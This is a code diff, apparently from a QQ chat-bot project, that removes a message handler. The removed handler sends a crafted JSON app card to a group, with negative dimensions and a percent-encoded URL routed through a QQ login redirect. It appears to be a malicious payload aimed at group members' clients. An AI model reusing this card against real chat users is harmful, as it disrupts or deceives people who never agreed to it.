@@ -106,37 +106,3 @@ export const gpt2xl: GlobalCommandHandler = async msg => {
 };
 
 export const deal: GlobalCommandHandler = async msg => {};
-
-export const stupid: TextHandler = async msg => {
-  if (msg.platform != 'oicq') return;
-
-  let bot: OICQBotAdapter = msg.bot;
-  'hit'.indexOf;
-  bot.instance.sendGroupMsg(
-    parseInt(msg.channelId),
-    segment.json({
-      app: 'com.tencent.qqvip_game_video',
-      desc: '',
-      view: 'gameVideoSingle',
-      ver: '0.0.0.1',
-      prompt: '[应用]',
-      meta: {
-        gameVideoSingle: {
-          DATA10: '',
-          DATA11: '',
-          DATA12: '',
-          DATA13: '0',
-          DATA14: 'videotest1',
-          DATA7:
-            'http://ptlogin2.qq.com/ho_cross_domain?tourl=%68%74%74%70%73://%67%78%68%2e%76%69%70%2e%71%71%2e%63%6f%6d/%78%79%64%61%74%61/%66%75%6e%63%61%6c%6c/%66%75%6e%43%61%6c%6c/%32%37%33%33/%6d%65%64%69%61%2e%6d%70%34',
-        },
-      },
-      config: {
-        forward: 1,
-        height: -3000,
-        type: 'normal',
-        width: -2200,
-      },
-    })
-  );
-};
